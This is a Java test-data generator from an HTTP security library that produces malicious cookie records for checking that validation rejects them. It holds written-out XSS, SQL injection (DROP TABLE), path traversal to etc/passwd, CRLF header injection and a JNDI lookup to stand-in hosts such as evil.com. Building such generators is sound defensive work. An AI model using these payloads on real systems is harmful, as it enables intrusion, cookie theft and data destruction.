/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.http.security.generators.cookie;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.http.security.data.Cookie;

/**
 * Generates malicious Cookie records for testing security validation.
 *
 * This generator produces only attack patterns and malicious cookie data that should be
 * rejected by security validation systems. It complements ValidCookieGenerator
 * which generates legitimate patterns.
 *
 * FRAMEWORK COMPLIANT: Uses seed-based generation without call-counter anti-pattern.
 * Reproducibility = f(seed), not f(internal_state).
 *
 * Implements: Task G8 (Attack Cases) from HTTP verification specification
 */
public class AttackCookieGenerator implements TypedGenerator<Cookie> {

    // Core generation parameters - all seed-based, no internal state
    private final TypedGenerator<Integer> attackTypeGenerator = Generators.integers(0, 3);
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> longStringSize = Generators.integers(100, 200);
    private final TypedGenerator<Integer> veryLongStringSize = Generators.integers(5000, 8000);

    @Override
    public Cookie next() {
        int attackType = attackTypeGenerator.next();

        String name = switch (attackType) {
            case 0 -> generateMaliciousName();
            case 1 -> generateSpecialCharName();
            case 2 -> generateControlCharName();
            case 3 -> generateVeryLongName();
            default -> generateMaliciousName();
        };

        String value = generateAttackValue();
        String attributes = generateMaliciousAttributes();

        return new Cookie(name, value, attributes);
    }

    private String generateMaliciousName() {
        int nameType = Generators.integers(0, 6).next();
        return switch (nameType) {
            case 0 -> ""; // Empty name
            case 1 -> "   "; // Whitespace name
            case 2 -> "cookie with spaces";
            case 3 -> "cookie=equals";
            case 4 -> "cookie;semicolon";
            case 5 -> "cookie,comma";
            case 6 -> "cookie[bracket]";
            default -> "";
        };
    }

    private String generateSpecialCharName() {
        int charType = Generators.integers(0, 4).next();
        return switch (charType) {
            case 0 -> "cookie{brace}";
            case 1 -> "cookie|pipe";
            case 2 -> "cookie\\backslash";
            case 3 -> "cookie\"quote";
            case 4 -> "cookie'apostrophe";
            default -> "cookie{brace}";
        };
    }

    private String generateControlCharName() {
        int controlType = Generators.integers(0, 2).next();
        return switch (controlType) {
            case 0 -> "cookie\ttab";
            case 1 -> "cookie\nnewline";
            case 2 -> "cookie\rcarriage";
            default -> "cookie\ttab";
        };
    }

    private String generateVeryLongName() {
        String baseName = "very_long_cookie_name_";
        int size = longStringSize.next();
        return baseName + Generators.letterStrings(size, size + 50).next();
    }

    private String generateAttackValue() {
        int attackType = Generators.integers(0, 10).next();
        return switch (attackType) {
            case 0 -> generateXSSAttack();
            case 1 -> generateSQLInjection();
            case 2 -> generatePathTraversal();
            case 3 -> generateNullByteAttack();
            case 4 -> generateJNDIAttack();
            case 5 -> generateHeaderInjection();
            case 6 -> generateUnicodeAttack();
            case 7 -> generateControlCharAttack();
            case 8 -> generateVeryLongValue();
            case 9 -> generateJavaScriptProtocolAttack();
            case 10 -> generateDataUrlAttack();
            default -> generateXSSAttack();
        };
    }

    private String generateXSSAttack() {
        int tagType = Generators.integers(0, 3).next();
        String tag = switch (tagType) {
            case 0 -> "script";
            case 1 -> "img";
            case 2 -> "iframe";
            case 3 -> "object";
            default -> "script";
        };

        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert('xss')";
            case 1 -> "alert(1)";
            case 2 -> "alert(document.cookie)";
            default -> "alert(1)";
        };

        return "<" + tag + ">" + payload + "</" + tag + ">";
    }

    private String generateSQLInjection() {
        int commandType = Generators.integers(0, 2).next();
        String command = switch (commandType) {
            case 0 -> "DROP TABLE";
            case 1 -> "DELETE FROM";
            case 2 -> "INSERT INTO";
            default -> "DROP TABLE";
        };

        int tableType = Generators.integers(0, 2).next();
        String table = switch (tableType) {
            case 0 -> "sessions";
            case 1 -> "users";
            case 2 -> "cookies";
            default -> "users";
        };

        return "'; " + command + " " + table + "; --";
    }

    private String generatePathTraversal() {
        int depth = Generators.integers(2, 5).next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }

        int pathType = Generators.integers(0, 2).next();
        String systemPath = switch (pathType) {
            case 0 -> "etc/passwd";
            case 1 -> "windows/win.ini";
            case 2 -> "admin/config";
            default -> "etc/passwd";
        };

        path.append(systemPath);
        return path.toString();
    }

    private String generateNullByteAttack() {
        int nullByteType = Generators.integers(0, 1).next();
        return switch (nullByteType) {
            case 0 -> "\u0000null_byte";
            case 1 -> "value\u0000truncated";
            default -> "\u0000null_byte";
        };
    }

    private String generateJNDIAttack() {
        int domainType = Generators.integers(0, 2).next();
        String domain = switch (domainType) {
            case 0 -> "evil.com";
            case 1 -> "attacker.net";
            case 2 -> "malicious.org";
            default -> "evil.com";
        };
        return "${jndi:ldap://" + domain + "/}";
    }

    private String generateHeaderInjection() {
        int injectionType = Generators.integers(0, 3).next();
        return switch (injectionType) {
            case 0 -> "\r\nSet-Cookie: injected=value";
            case 1 -> "\r\n\r\nHTTP/1.1 200 OK";
            case 2 -> "%0d%0aSet-Cookie: evil=bad";
            case 3 -> "value%0d%0aSet-Cookie: injected=1";
            default -> "\r\nSet-Cookie: injected=value";
        };
    }

    private String generateUnicodeAttack() {
        return "\u202e\u202d"; // Unicode direction override
    }

    private String generateControlCharAttack() {
        int controlType = Generators.integers(0, 2).next();
        String control = switch (controlType) {
            case 0 -> "\t";
            case 1 -> "\r";
            case 2 -> "\n";
            default -> "\t";
        };
        return control + " injected";
    }

    private String generateVeryLongValue() {
        int size = veryLongStringSize.next();
        return Generators.letterStrings(size, size + 1000).next();
    }

    private String generateJavaScriptProtocolAttack() {
        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert(1)";
            case 1 -> "alert('xss')";
            case 2 -> "alert(document.cookie)";
            default -> "alert(1)";
        };
        return "javascript:" + payload;
    }

    private String generateDataUrlAttack() {
        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert(1)";
            case 1 -> "alert('xss')";
            case 2 -> "<script>alert(1)</script>";
            default -> "alert(1)";
        };
        return "data:text/html," + payload;
    }

    private String generateMaliciousAttributes() {
        int attributeType = Generators.integers(0, 3).next();
        return switch (attributeType) {
            case 0 -> generateMaliciousDomainAttribute();
            case 1 -> generateTraversalPathAttribute();
            case 2 -> generateHeaderInjectionAttribute();
            case 3 -> generateMalformedAttributes();
            default -> generateMaliciousDomainAttribute();
        };
    }

    private String generateMaliciousDomainAttribute() {
        int domainType = Generators.integers(0, 2).next();
        String domain = switch (domainType) {
            case 0 -> ".evil.com";
            case 1 -> ".attacker.net";
            case 2 -> ".malicious.org";
            default -> ".evil.com";
        };
        return "Domain=" + domain + "; Path=/";
    }

    private String generateTraversalPathAttribute() {
        return "Path=../../../";
    }

    private String generateHeaderInjectionAttribute() {
        int injectionType = Generators.integers(0, 2).next();
        return switch (injectionType) {
            case 0 -> "Domain=example.com\r\nSet-Cookie: evil=bad";
            case 1 -> "Path=/\u0000/admin";
            case 2 -> "Max-Age=-1";
            default -> "Domain=example.com\r\nSet-Cookie: evil=bad";
        };
    }

    private String generateMalformedAttributes() {
        int malformType = Generators.integers(0, 3).next();
        return switch (malformType) {
            case 0 -> "Domain=; Path="; // Empty values
            case 1 -> "Invalid=Attribute; Bad=Value"; // Invalid attributes
            case 2 -> "Domain="; // Incomplete attribute
            case 3 -> "=; Path=/"; // Missing attribute name
            default -> "Domain=; Path=";
        };
    }

    @Override
    public Class<Cookie> getType() {
        return Cookie.class;
    }
}